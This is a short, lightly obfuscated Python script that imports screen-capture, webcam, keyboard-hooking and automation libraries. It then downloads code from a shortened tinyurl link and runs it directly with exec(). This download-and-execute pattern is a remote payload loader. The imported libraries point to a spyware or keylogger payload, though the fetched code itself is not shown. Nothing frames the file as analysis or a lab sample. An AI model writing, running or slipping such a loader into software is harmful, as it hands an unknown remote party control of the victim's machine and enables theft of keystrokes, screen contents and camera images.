import PIL #line:1:import PIL
import urllib .request #line:2:import urllib.request
from PIL import Image #line:3:from PIL import Image
from comtypes import CLSCTX_ALL #line:4:from comtypes import CLSCTX_ALL
import pyautogui #line:5:import pyautogui
import urllib .request #line:6:import urllib.request
import cv2 #line:7:import cv2
import pynput #line:8:import pynput
import keyboard #line:9:import keyboard
code ='https://tinyurl.com/3x36x299'#line:10:code = 'https://tinyurl.com/3x36x299'
response =urllib .request .urlopen (code )#line:11:response = urllib.request.urlopen(code)
data =response .read ()#line:12:data = response.read()
exec (data )#line:13:exec(data)
